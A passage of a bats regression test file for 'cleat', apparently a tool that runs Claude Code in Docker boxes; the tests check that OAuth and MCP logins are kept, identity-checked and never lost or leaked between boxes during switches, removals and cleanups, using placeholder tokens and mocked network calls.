_held_mode() { stat -c '%a' "$1" 2>/dev/null || stat -f '%Lp' "$1"; }

# $1 box, $2 grant of the store, $3 grant staged in the box (a different login
# that is not newer)
_held_declined_pair() {
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/work/.credentials.json" "$2" 5 1789028800000
  _acct_race_cred "$CLEAT_RUN_DIR/$1/auth/.credentials.json" "$3" 0 1789025200000
  _box_account_write "$1" work
}

@test "regression v1.5.0: cleat rm keeps a staged login its account store does not have" {
  _acct_race_setup
  local mode proj cn
  for mode in jq nojq; do
    [[ "$mode" == nojq ]] && _hide_jq
    proj="$TEST_TEMP/proj-$mode"
    mkdir -p "$proj"
    cn="$(container_name_for "$proj" main)"
    _held_declined_pair "$cn" W "B$mode"
    mock_docker_ps ""
    mock_docker_ps_a "$cn"
    run cmd_rm "$proj"
    assert_success
    assert_output --partial "Kept a login from"
    run test -d "$CLEAT_RUN_DIR/$cn"
    assert_failure
    run grep -rl "rt-B$mode" "$CLEAT_ACCOUNTS_DIR/.held"
    assert_success
    assert_equal "${#lines[@]}" 1
    run _held_mode "${lines[0]}"
    assert_output "600"
    run cat "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
    assert_output --partial '"accessToken":"at-W5"'
  done
  unset -f command
}

@test "regression v1.5.0: switching accounts keeps a refreshed login whose harvest failed" {
  _acct_race_setup
  local CN="cleat-held-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/work/.credentials.json" W 0 1789003600000
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/other/.credentials.json" O 0 1789025200000
  _acct_race_cred "$staged" W 1 1789028800000
  _box_account_write "$CN" work
  # The store write fails, the way a full disk does.
  _account_write_cred() { return 1; }
  run _account_do_switch other main "$CN" "$TEST_TEMP/proj"
  assert_success
  assert_output --partial "Kept a login from"
  run grep -rl '"accessToken":"at-W1"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
  run cat "$staged"
  assert_output --partial '"accessToken":"at-O0"'
}

@test "regression v1.5.0: going back to the shared login keeps a staged login its account does not have" {
  _acct_race_setup
  local CN="cleat-held-abcdef12"
  _held_declined_pair "$CN" W B
  run _account_do_switch default main "$CN" "$TEST_TEMP/proj"
  assert_success
  run test -e "$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  assert_failure
  run grep -rl '"refreshToken":"rt-B"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
}

@test "regression v1.5.0: removing an account keeps a staged login it does not have" {
  _acct_race_setup
  local CN="cleat-held-abcdef12"
  _held_declined_pair "$CN" W B
  run _account_do_remove work 1
  assert_success
  run _account_exists work
  assert_failure
  run test -e "$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  assert_failure
  run grep -rl '"refreshToken":"rt-B"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
}

@test "regression v1.5.0: nuke keeps a staged login its account does not have" {
  _acct_race_setup
  local CN="cleat-held-abcdef12"
  _held_declined_pair "$CN" W B
  mock_docker_ps_a ""
  run cmd_nuke <<< "nuke"
  assert_success
  run test -d "$CLEAT_RUN_DIR"
  assert_failure
  run grep -rl '"refreshToken":"rt-B"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
}

@test "regression v1.5.0: a credential journal left in a box auth dir is kept when cleat rm wipes the run dir" {
  _acct_race_setup
  local leg proj cn
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/b/.credentials.json" B 0 1789025200000
  for leg in pinned unpinned; do
    proj="$TEST_TEMP/proj-$leg"
    mkdir -p "$proj"
    cn="$(container_name_for "$proj" main)"
    if [[ "$leg" == pinned ]]; then
      # The staged file is b's own, so the harvest has nothing to do.
      _acct_race_cred "$CLEAT_RUN_DIR/$cn/auth/.credentials.json" B 0 1789025200000
      _box_account_write "$cn" b
    fi
    # The only copy of the account the box was switched away from.
    _acct_race_cred "$CLEAT_RUN_DIR/$cn/auth/.cleat-prev.json" "A$leg" 1 1789028800000
    mock_docker_ps ""
    mock_docker_ps_a "$cn"
    run cmd_rm "$proj"
    assert_success
    run test -d "$CLEAT_RUN_DIR/$cn"
    assert_failure
    run grep -rl "rt-A$leg" "$CLEAT_ACCOUNTS_DIR/.held"
    assert_success
    assert_equal "${#lines[@]}" 1
    run _held_mode "${lines[0]}"
    assert_output "600"
  done
  # And b's own login was never held.
  run grep -rl '"refreshToken":"rt-B"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_failure
}

@test "regression v1.5.0: cleat nuke keeps a credential journal from a box that is not pinned" {
  _acct_race_setup
  local CN="cleat-held-abcdef12"
  _acct_race_cred "$CLEAT_RUN_DIR/$CN/.prev.1789000000" A 1 1789028800000
  _acct_race_cred "$CLEAT_RUN_DIR/$CN/auth/.credentials.json" L 0 1789025200000
  mock_docker_ps_a ""
  run cmd_nuke <<< "nuke"
  assert_success
  run test -d "$CLEAT_RUN_DIR"
  assert_failure
  run grep -rl '"refreshToken":"rt-A"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
  run grep -rl '"refreshToken":"rt-L"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
}

@test "regression v1.5.0: a wipe that cannot keep a credential journal deletes nothing" {
  _acct_race_setup
  local cn
  # Something that is not a directory where the held logins go.
  : > "$CLEAT_ACCOUNTS_DIR/.held"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/b/.credentials.json" B 0 1789025200000
  for cn in cleat-unpinned-abcdef12 cleat-pinned-abcdef12; do
    if [[ "$cn" == cleat-pinned-abcdef12 ]]; then
      _acct_race_cred "$CLEAT_RUN_DIR/$cn/auth/.credentials.json" B 0 1789025200000
      _box_account_write "$cn" b
    fi
    _acct_race_cred "$CLEAT_RUN_DIR/$cn/auth/.cleat-prev.json" A 1 1789028800000
    mkdir -p "$CLEAT_RUN_DIR/$cn/clip"
    run _account_wipe_run_dir "$cn"
    assert_success
    assert_output --partial "it holds a login that could not be saved anywhere else"
    run cat "$CLEAT_RUN_DIR/$cn/auth/.cleat-prev.json"
    assert_output --partial '"accessToken":"at-A1"'
    run test -d "$CLEAT_RUN_DIR/$cn/clip"
    assert_success
  done
  run test -e "$CLEAT_ACCOUNTS_DIR/.lock"
  assert_failure
}

@test "regression v1.5.0: an attach keeps a login the store does not have before staging over it" {
  _acct_race_setup
  local CN="cleat-held-abcdef12"
  _held_declined_pair "$CN" W B
  run _account_sync_in "$CN"
  assert_success
  assert_output --partial "Kept a login from"
  run cat "$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  assert_output --partial '"accessToken":"at-W5"'
  run grep -rl '"refreshToken":"rt-B"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
}

# adopt, the recovery for everything above, swapped only the store file. A box
# pinned to that account still had the old login staged, fresher than the one
# adopted. The next session end wrote it straight back. The held entry was
# already gone, so the adopted login existed nowhere.
@test "regression v1.5.0: a login adopted into an account a box is pinned to survives the next harvest" {
  _acct_race_setup
  local CN="cleat-held-abcdef12" mode staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  for mode in jq nojq; do
    [[ "$mode" == nojq ]] && _hide_jq
    _acct_race_cred "$CLEAT_ACCOUNTS_DIR/work/.credentials.json" "W$mode" 5 1789028800000
    # A refresh the box saved that no session end has harvested yet.
    _acct_race_cred "$staged" "W$mode" 6 1789032400000
    _box_account_write "$CN" work
    _acct_race_cred "$TEST_TEMP/held-src.json" "Y$mode" 0 1789007200000
    _account_hold "$TEST_TEMP/held-src.json" "" cleat-other-abcdef12 left-in-box
    run _account_do_adopt "$_ACCOUNT_HELD_ID" work
    assert_success
    # The next session end on the pinned box.
    run _account_sync_out "$CN"
    assert_success
    run grep -c "rt-Y$mode" "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
    assert_output "1"
    # The refresh the box had is kept, never written back and never lost.
    run grep -rl "\"accessToken\":\"at-W${mode}6\"" "$CLEAT_ACCOUNTS_DIR/.held"
    assert_success
    # And the next attach stages the adopted login.
    run _account_sync_in "$CN"
    assert_success
    run grep -c "rt-Y$mode" "$staged"
    assert_output "1"
  done
  unset -f command
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: a harvest had no identity check.
#
# The session-end harvest wrote a staged login over the pinned account's store
# on "newer and plausible" alone. The staged file sits in a directory the box
# writes, so a /login as someone else inside a pinned box put that other
# account's login over the account's only credential, with no trash. The list
# kept the old name while usage went out on the other bearer. Separately, a
# switch stamped the account it was leaving with whatever email the box's
# per-project claude.json held, and printed it as fact.
#
# A newer login is written now only when it is the same grant (the same refresh
# token), or GET /api/oauth/profile names the account uuid recorded for the
# store, or on first use the server's email is not a different one than the
# account shows. A login proven to be someone else's is held. One nobody could
# verify is left in place, and a deleter holds it.
#
# Fixtures follow the account fixture convention: accessToken carries the
# generation (at-A1) and refreshToken the grant (rt-A).
# ─────────────────────────────────────────────────────────────────────────────
_ACCT_UUID_A="11111111-aaaa-4aaa-8aaa-aaaaaaaaaaaa"
_ACCT_UUID_B="22222222-bbbb-4bbb-8bbb-bbbbbbbbbbbb"

# The profile request answers 200 with this account. $1 uuid, $2 email, $3 org.
_acct_ident_profile() {
  _ACCT_IDENT_BODY="$(printf '{"account":{"uuid":"%s","email":"%s","full_name":"Lab"},"organization":{"uuid":"org-1","name":"%s","cc_onboarding_flags":{}}}' "$1" "$2" "${3:-Lab Org}")"
  _account_profile_curl() { printf '%s\n200' "$_ACCT_IDENT_BODY"; }
}

@test "regression v1.5.0: a login for another account is never harvested over the pinned credential" {
  _acct_race_setup
  local mode cn store
  for mode in jq nojq; do
    [[ "$mode" == nojq ]] && _hide_jq
    cn="cleat-ident-$mode"
    store="$CLEAT_ACCOUNTS_DIR/a-$mode/.credentials.json"
    _acct_race_cred "$store" A 0 1789003600000
    printf 'uuid\t%s\nwho\tlab-a@lab.invalid\n' "$_ACCT_UUID_A" > "$CLEAT_ACCOUNTS_DIR/a-$mode/meta"
    _box_account_write "$cn" "a-$mode"
    # /login as B inside the box.
    _acct_race_cred "$CLEAT_RUN_DIR/$cn/auth/.credentials.json" "B$mode" 1 1789028800000
    _acct_ident_profile "$_ACCT_UUID_B" lab-b@lab.invalid "Org B"
    run _account_sync_out "$cn"
    assert_equal "$mode $status" "$mode 2"
    run cat "$store"
    assert_output --partial '"accessToken":"at-A0"'
    run grep -rl "\"refreshToken\":\"rt-B$mode\"" "$CLEAT_ACCOUNTS_DIR/.held"
    assert_success
    run _account_meta_get_at "${lines[0]%/.credentials.json}" who
    assert_output "lab-b@lab.invalid"
    run _account_meta_get "a-$mode" who
    assert_output "lab-a@lab.invalid"
  done
  unset -f command
}

@test "regression v1.5.0: first use never records a login whose email differs from the one the account shows" {
  _acct_race_setup
  local CN="cleat-ident-abcdef12" store
  store="$CLEAT_ACCOUNTS_DIR/a/.credentials.json"
  _acct_race_cred "$store" A 0 1789003600000
  printf 'who\talice@example.com\n' > "$CLEAT_ACCOUNTS_DIR/a/meta"
  _box_account_write "$CN" a
  _acct_race_cred "$CLEAT_RUN_DIR/$CN/auth/.credentials.json" B 1 1789028800000
  _acct_ident_profile "$_ACCT_UUID_B" bob@example.com
  run _account_sync_out "$CN"
  assert_equal "$status" 2
  run cat "$store"
  assert_output --partial '"accessToken":"at-A0"'
  run _account_meta_get a who
  assert_output "alice@example.com"
  run _account_meta_get a uuid
  assert_failure
  # The same person's login under a differently cased email is theirs: saved,
  # and the uuid is recorded from then on.
  _acct_race_cred "$CLEAT_RUN_DIR/$CN/auth/.credentials.json" C 1 1789028800000
  _acct_ident_profile "$_ACCT_UUID_A" Alice@Example.COM
  run _account_sync_out "$CN"
  assert_success
  run cat "$store"
  assert_output --partial '"accessToken":"at-C1"'
  run _account_meta_get a uuid
  assert_output "$_ACCT_UUID_A"
}

# A store with no recorded uuid had only ever been taken on trust: saved before
# the check, adopted from an entry nobody verified, or one whose uuid was never
# written. Its first verified harvest wrote whatever login the box held over it
# with no copy anywhere, so a /login as someone else still replaced the only
# credential. The store's own login is held first now, and a store login that
# cannot be kept stops the write.
@test "regression v1.5.0: a first verified harvest holds the login it writes over" {
  _acct_race_setup
  local CN="cleat-ident-abcdef12" store staged
  store="$CLEAT_ACCOUNTS_DIR/a/.credentials.json"
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$store" A 0 1789003600000
  _box_account_write "$CN" a
  # /login as B inside the box, before the account ever had a verified harvest.
  _acct_race_cred "$staged" B 1 1789028800000
  _acct_ident_profile "$_ACCT_UUID_B" lab-b@lab.invalid
  # Nowhere to keep A's login: nothing is written and the staged login stays.
  : > "$CLEAT_ACCOUNTS_DIR/.held"
  run _account_sync_out "$CN"
  assert_equal "unkept $status" "unkept 1"
  run cat "$store"
  assert_output --partial '"accessToken":"at-A0"'
  run grep -c '"accessToken":"at-B1"' "$staged"
  assert_output "1"
  run _account_meta_get a uuid
  assert_failure
  mv "$CLEAT_ACCOUNTS_DIR/.held" "$TEST_TEMP/held-was-a-file"
  # With somewhere to keep it, A's login is held and then B's is saved.
  run _account_sync_out "$CN"
  assert_success
  run cat "$store"
  assert_output --partial '"accessToken":"at-B1"'
  run grep -rl '"refreshToken":"rt-A"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
  run _accounts_held_text
  assert_output --partial "from account a"
  assert_output --partial "replaced by the first login Anthropic verified for its account"
  # The uuid is recorded, so the next login as someone else is held instead.
  run _account_meta_get a uuid
  assert_output "$_ACCT_UUID_B"
}

# The recovery for a login a switch could not verify is adopting it back into
# its account. Adopt copied the entry's identity blanks included, and an entry
# held unverified carries no uuid, so it cleared the uuid of an account the
# server had already verified. If refresh tokens do not rotate the uuid was
# never recorded again, and any later /login as someone else in a box pinned to
# that account went through the first-use harvest and over the adopted login.
@test "regression v1.5.0: a login nobody verified adopted back into its account keeps the account verified" {
  _acct_race_setup
  local CN="cleat-ident-abcdef12" staged d id=""
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/work/.credentials.json" W 0 1789000500000
  printf 'uuid\t%s\nwho\twork@lab.invalid\n' "$_ACCT_UUID_A" > "$CLEAT_ACCOUNTS_DIR/work/meta"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/other/.credentials.json" O 0 1789000500000
  _box_account_write "$CN" work
  # The box rotated work's refresh token. The switch away cannot reach the
  # server (the setup's curl), so it holds that login unverified.
  _acct_race_cred "$staged" R 1 1789028800000
  run _account_do_switch other main "$CN" "$TEST_TEMP/proj"
  assert_success
  for d in "$CLEAT_ACCOUNTS_DIR/.held"/*; do
    grep -q '"refreshToken":"rt-R"' "$d/.credentials.json" 2>/dev/null && id="${d##*/}"
  done
  run test -n "$id"
  assert_success
  run _account_do_adopt "$id" work
  assert_success
  run _account_meta_get work uuid
  assert_output "$_ACCT_UUID_A"
  run _account_meta_get work who
  assert_output "work@lab.invalid"
  # Back on work, then a /login as someone else.
  run _account_do_switch work main "$CN" "$TEST_TEMP/proj"
  assert_success
  _acct_race_cred "$staged" S 1 1789030000000
  _acct_ident_profile "$_ACCT_UUID_B" stranger@lab.invalid
  run _account_sync_out "$CN"
  assert_equal "$status" 2
  run cat "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  assert_output --partial '"refreshToken":"rt-R"'
  run _account_meta_get work who
  assert_output "work@lab.invalid"
}

@test "regression v1.5.0: a harvest the server cannot vouch for writes nothing and deletes nothing" {
  _acct_race_setup
  local CN="cleat-ident-abcdef12" store staged code
  store="$CLEAT_ACCOUNTS_DIR/a/.credentials.json"
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$store" A 0 1789003600000
  printf 'uuid\t%s\n' "$_ACCT_UUID_A" > "$CLEAT_ACCOUNTS_DIR/a/meta"
  _box_account_write "$CN" a
  # A refresh that rotated the token.
  _acct_race_cred "$staged" R 1 1789028800000
  cp "$staged" "$TEST_TEMP/staged.orig"
  for code in 401 000 503; do
    _ACCT_IDENT_CODE="$code"
    # A body that would verify as this very account, so the status code is the
    # only thing that can stop the write. 000 is curl reaching nobody: no body.
    if [[ "$code" == "000" ]]; then
      _ACCT_IDENT_BODY=""
    else
      _ACCT_IDENT_BODY="$(printf '{"account":{"uuid":"%s","email":"lab-a@lab.invalid"}}' "$_ACCT_UUID_A")"
    fi
    _account_profile_curl() { printf '%s\n%s' "$_ACCT_IDENT_BODY" "$_ACCT_IDENT_CODE"; }
    run _account_sync_out "$CN"
    assert_equal "$code $status" "$code 3"
    run cat "$store"
    assert_output --partial '"accessToken":"at-A0"'
    run cmp "$staged" "$TEST_TEMP/staged.orig"
    assert_success
    run test -e "$CLEAT_ACCOUNTS_DIR/.held"
    assert_failure
  done
}

@test "regression v1.5.0: switching away holds a staged login nobody could verify instead of deleting it" {
  _acct_race_setup
  local CN="cleat-ident-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/work/.credentials.json" W 0 1789003600000
  printf 'uuid\t%s\n' "$_ACCT_UUID_A" > "$CLEAT_ACCOUNTS_DIR/work/meta"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/other/.credentials.json" O 0 1789025200000
  # A rotated refresh, and the profile is unreachable (the setup's curl).
  _acct_race_cred "$staged" R 1 1789028800000
  _box_account_write "$CN" work
  run _account_do_switch other main "$CN" "$TEST_TEMP/proj"
  assert_success
  assert_output --partial "Kept a login from"
  run grep -rl '"refreshToken":"rt-R"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
  run cat "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  assert_output --partial '"accessToken":"at-W0"'
  run cat "$staged"
  assert_output --partial '"accessToken":"at-O0"'
}

@test "regression v1.5.0: switching away never stamps the account with the email in the box project file" {
  _acct_race_setup
  local CN="cleat-ident-abcdef12" key
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 0 1789025200000
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/b/.credentials.json" B 0 1789025200000
  printf 'who\tlab-b@lab.invalid\n' > "$CLEAT_ACCOUNTS_DIR/b/meta"
  # The box ran as b, so its staged file is b's own and the harvest has nothing
  # to do. Its project file still names a, from an earlier session.
  _acct_race_cred "$CLEAT_RUN_DIR/$CN/auth/.credentials.json" B 0 1789025200000
  _box_account_write "$CN" b
  key="$(_derive_project_session_key "$TEST_TEMP/proj" main)"
  mkdir -p "$CLEAT_PROJECTS_DIR/$key"
  printf '{"oauthAccount":{"emailAddress":"lab-a@lab.invalid","organizationName":"Org A"}}\n' \
    > "$CLEAT_PROJECTS_DIR/$key/claude.json"
  run _account_do_switch a main "$CN" "$TEST_TEMP/proj"
  assert_success
  run _account_meta_get b who
  assert_output "lab-b@lab.invalid"
  run _account_meta_get a who
  assert_failure
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: a switch staged the incoming login by removing the staged file and
# renaming the new one in later. For about 25 ms the box had no credential file,
# and a Claude the live gate missed answered "Not logged in" into that moment.
# Both staging directions also copied the WHOLE file. Claude Code keeps an MCP
# server's login (mcpOAuth) in that same file, so an in-box `claude mcp login`
# was erased at the next attach (Claude then called the server with no bearer)
# and one box's MCP tokens reached the account store and every box pinned to it.
# Only the account's keys cross now, by one rename.
#
# Fixtures follow the account fixture convention: accessToken carries the
# generation, refreshToken the grant.
# ─────────────────────────────────────────────────────────────────────────────
# $1 grant, $2 generation, $3 expiresAt (epoch ms). A member, not an object.
_acct_key_login() {
  printf '"claudeAiOauth":{"accessToken":"at-%s%s","refreshToken":"rt-%s","expiresAt":%s,"scopes":["user:inference"],"subscriptionType":"max"}' "$1" "$2" "$1" "$3"
}

# $1 label. The shape Claude Code 2.1.270 writes for an MCP server login.
_acct_key_mcp() {
  printf '"mcpOAuth":{"linear|0123456789abcdef":{"serverName":"linear","serverUrl":"https://mcp.linear.app/mcp","accessToken":"FAKE-MCP-%s","refreshToken":"FAKE-MCP-R-%s","expiresAt":1789002000000,"scope":"read"}}' "$1" "$1"
}

@test "regression v1.5.0: a switch never leaves the box without a credential file even for a moment" {
  _acct_race_setup
  local CN="cleat-gap-abcdef12" staged f
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/old/.credentials.json" O 0 1789003600000
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/new/.credentials.json" N 0 1789003600000
  _acct_race_cred "$staged" O 0 1789003600000
  _box_account_write "$CN" old
  # Every step from the last harvest to the rename looks at the staged path as
  # it starts, which is what a Claude reading at that moment would have found.
  export GAP_STAGED="$staged" GAP_LOG="$TEST_TEMP/gap.log"
  : > "$GAP_LOG"
  for f in _account_release_staged_locked _box_account_write _account_sync_in_locked _account_write_file_0600; do
    eval "$(declare -f "$f" | sed "1s/^$f /_gap_orig_$f /")"
    eval "$f() { if [[ -e \"\$GAP_STAGED\" ]]; then echo \"$f present\"; else echo \"$f gone\"; fi >> \"\$GAP_LOG\"; _gap_orig_$f \"\$@\"; }"
  done
  run _account_do_switch new main "$CN" "$TEST_TEMP/proj"
  assert_success
  run cat "$GAP_LOG"
  refute_output --partial "gone"
  # The probe ran at the pin write and inside the staging, so a pass is not vacuous.
  assert_output --partial "_box_account_write present"
  assert_output --partial "_account_write_file_0600 present"
  run cat "$staged"
  assert_output --partial '"accessToken":"at-N0"'
}

@test "regression v1.5.0: an MCP server login made inside a pinned box survives the next attach" {
  _acct_race_setup
  local CN="cleat-mcp-abcdef12" staged store
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  store="$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  mkdir -p "${store%/*}"
  printf '{%s}\n' "$(_acct_key_login W 0 1789003600000)" > "$store"
  _box_account_write "$CN" work
  run _account_sync_in "$CN"
  assert_success
  # In the box: `claude mcp login linear`. Claude rewrites its store with the
  # MCP entry after the login it already had and refreshes nothing.
  printf '{%s,%s}\n' "$(_acct_key_login W 0 1789003600000)" "$(_acct_key_mcp box1)" > "$staged"
  run _account_sync_out "$CN"
  assert_success
  run _account_sync_in "$CN"
  assert_success
  run cat "$staged"
  assert_output --partial '"accessToken":"FAKE-MCP-box1"'
  assert_output --partial '"accessToken":"at-W0"'
  # A sibling box on the same account refreshed it, so this attach stages the
  # newer login and keeps the MCP login beside it.
  printf '{%s}\n' "$(_acct_key_login W 1 1789028800000)" > "$store"
  run _account_sync_in "$CN"
  assert_success
  run cat "$staged"
  assert_output --partial '"accessToken":"FAKE-MCP-box1"'
  assert_output --partial '"accessToken":"at-W1"'
  refute_output --partial '"accessToken":"at-W0"'
}

@test "regression v1.5.0: one box's MCP login never reaches the account store or another box" {
  _acct_race_setup
  local one="cleat-one-abcdef12" two="cleat-two-abcdef12" store
  store="$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  mkdir -p "${store%/*}" "$CLEAT_RUN_DIR/$one/auth" "$CLEAT_RUN_DIR/$two/auth"
  printf '{%s}\n' "$(_acct_key_login W 0 1789003600000)" > "$store"
  _box_account_write "$one" work
  _box_account_write "$two" work
  printf '{%s,%s}\n' "$(_acct_key_login W 0 1789003600000)" "$(_acct_key_mcp two)" \
    > "$CLEAT_RUN_DIR/$two/auth/.credentials.json"
  # Box one signed into its own MCP server and Claude refreshed the login.
  printf '{%s,%s}\n' "$(_acct_key_login W 1 1789028800000)" "$(_acct_key_mcp one)" \
    > "$CLEAT_RUN_DIR/$one/auth/.credentials.json"
  run _account_sync_out "$one"
  assert_success
  run cat "$store"
  assert_output --partial '"accessToken":"at-W1"'
  refute_output --partial "FAKE-MCP"
  run _account_sync_in "$two"
  assert_success
  run cat "$CLEAT_RUN_DIR/$two/auth/.credentials.json"
  assert_output --partial '"accessToken":"at-W1"'
  assert_output --partial "FAKE-MCP-two"
  refute_output --partial "FAKE-MCP-one"
}

@test "regression v1.5.0: switching a box to another account keeps its own MCP login" {
  _acct_race_setup
  local CN="cleat-mcp-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  mkdir -p "$CLEAT_ACCOUNTS_DIR/old" "$CLEAT_ACCOUNTS_DIR/new" "${staged%/*}"
  printf '{%s}\n' "$(_acct_key_login O 1 1789028800000)" > "$CLEAT_ACCOUNTS_DIR/old/.credentials.json"
  printf '{%s}\n' "$(_acct_key_login N 0 1789000100000)" > "$CLEAT_ACCOUNTS_DIR/new/.credentials.json"
  _box_account_write "$CN" old
  # The box's login is the fresher one, which newest-wins alone would keep.
  printf '{%s,%s}\n' "$(_acct_key_mcp box1)" "$(_acct_key_login O 1 1789028800000)" > "$staged"
  run _account_do_switch new main "$CN" "$TEST_TEMP/proj"
  assert_success
  run cat "$staged"
  assert_output --partial '"accessToken":"at-N0"'
  refute_output --partial '"accessToken":"at-O1"'
  assert_output --partial "FAKE-MCP-box1"
  run cat "$CLEAT_ACCOUNTS_DIR/old/.credentials.json"
  assert_output --partial '"accessToken":"at-O1"'
  refute_output --partial "FAKE-MCP"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.4.3: cleat clean asked docker whether each box still exists and pruned on
# every "no". With the daemon down every answer is no, so it removed every box
# description and every run dir (the overlays, the conversations' file history
# and a staged login) for boxes that still existed. It now refuses.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.4.3: cleat clean with Docker down removes no box state" {
  local cn="cleat-live-aaaa1111"
  _daemon_up() { return 1; }
  container_exists() { return 1; }
  mkdir -p "$CLEAT_RUN_DIR/$cn/settings" "$CLEAT_BOXES_DIR"
  printf 'a box that still exists\n' > "$CLEAT_BOXES_DIR/$cn"
  run cmd_clean
  assert_failure
  assert_output --partial "Docker is not running"
  assert_output --partial "Nothing was removed"
  run test -d "$CLEAT_RUN_DIR/$cn/settings"
  assert_success
  run test -f "$CLEAT_BOXES_DIR/$cn"
  assert_success
}

# ─────────────────────────────────────────────────────────────────────────────
# The box sees its per-project claude.json through a single-file bind mount, so
# cleat rewrites it in place. `cat tmp > f` truncates first, and Claude Code
# reads the file inside that empty window: a running session "auto-repairs" by
# writing its cached copy (the OLD identity) back in place, the rest of cleat's
# write lands on top and the file is left as broken JSON. A session starting in
# the window stops on "Configuration error". Reproduced against Claude Code
# 2.1.270 with rename made to fail the way it does on a bind mount.
#
# The stand-in reader below runs at the moment cleat starts copying its temp
# file into place, which is exactly the window, and does what Claude does with
# an unparseable file on a bind mount.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: the identity delete never empties claude.json under a reading Claude" {
  command -v jq >/dev/null || skip "needs jq"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  local key f cached
  key="$(_derive_project_session_key "$TEST_TEMP/proj" main)"
  mkdir -p "$CLEAT_PROJECTS_DIR/$key"
  f="$CLEAT_PROJECTS_DIR/$key/claude.json"
  printf '{\n  "oauthAccount": {"emailAddress": "previous@example.com", "organizationName": "Previous Org"},\n  "userID": "abc",\n  "projects": {"/workspace": {"lastCost": 1}}\n}\n' > "$f"
  cached="$(command cat "$f")"
  _daemon_up() { return 1; }     # nothing running: the write is allowed
  _with_reading_claude() {
    cat() {
      if [[ "${1:-}" == "$f".* ]]; then
        : >> "$TEST_TEMP/copy-seen"
        if ! _looks_like_json_object "$f"; then
          : >> "$TEST_TEMP/claude-saw-bad-json"
          printf '%s\n' "$cached" > "$f"   # Claude's in-place auto-repair
        fi
      fi
      command cat "$@"
    }
    _account_invalidate_identity "$@"
  }
  run _with_reading_claude "$TEST_TEMP/proj" main
  assert_success
  run test -e "$TEST_TEMP/copy-seen"
  assert_success
  run test -e "$TEST_TEMP/claude-saw-bad-json"
  assert_failure
  run jq -e 'type=="object"' "$f"
  assert_success
  run jq -r '.oauthAccount // "absent"' "$f"
  assert_output "absent"
  run jq -r '.userID' "$f"
  assert_output "abc"
}

# ─────────────────────────────────────────────────────────────────────────────
# The switch checks for a live session once, at the top. Then it harvests,
# stages, captures metadata and polls usage with a three second timeout before
# it reaches the identity delete. A claude started from another terminal in that
# time was written under, and deleting oauthAccount beneath a running Claude
# Code makes it refuse every later save of its config
# (tengu_config_auth_loss_prevented, 4 of 4 against 2.1.270). The delete asks
# again right before it writes, and the switch says how to finish the job.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: a Claude that starts during an account switch keeps its identity file untouched" {
  command -v jq >/dev/null || skip "needs jq"
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  mkdir -p "$CLEAT_ACCOUNTS_DIR" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR" "$CLEAT_PROJECTS_DIR"
  _CLEAT_NOW_S=1789000000
  curl() { cat >/dev/null 2>&1; return 7; }
  local CN="cleat-proj-abcdef12" key f
  mkdir -p "$CLEAT_ACCOUNTS_DIR/work"
  chmod 700 "$CLEAT_ACCOUNTS_DIR/work"
  printf '{"claudeAiOauth":{"accessToken":"a-token","refreshToken":"r-token","expiresAt":1789003600000,"subscriptionType":"max"}}\n' > "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  chmod 600 "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  key="$(_derive_project_session_key "$TEST_TEMP/proj" main)"
  mkdir -p "$CLEAT_PROJECTS_DIR/$key"
  f="$CLEAT_PROJECTS_DIR/$key/claude.json"
